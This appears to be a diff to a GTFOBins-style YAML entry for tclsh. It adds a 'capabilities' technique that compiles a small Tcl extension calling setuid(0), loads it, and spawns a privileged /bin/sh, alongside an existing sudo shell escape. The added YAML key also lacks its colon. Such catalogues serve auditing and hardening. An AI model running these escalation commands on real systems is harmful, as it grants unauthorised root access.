@@ -18,4 +18,11 @@ functions:
     - code: |
         sudo tclsh
         exec /bin/sh <@stdin >@stdout 2>@stderr
+  capabilities
+   - code: |
+        echo -e '#include <tcl.h>\n#include <unistd.h>\nint SetUidCmd(ClientData, Tcl_Interp *interp, int, const char **) { return setuid(0) == -1 ? (Tcl_SetResult(interp, "Failed to set UID", TCL_STATIC), TCL_ERROR) : TCL_OK; } int Setuid_Init(Tcl_Interp *interp) { Tcl_CreateCommand(interp, "setuid", SetUidCmd, NULL, NULL); return TCL_OK; }' | gcc -shared -o setuid.so -fPIC -I/usr/include/tcl8.6 -ltcl -x c -
+        ./tclsh
+        load ./setuid.so
+        setuid
+        exec /bin/sh -p <@stdin >@stdout 2>@stderr
 ---
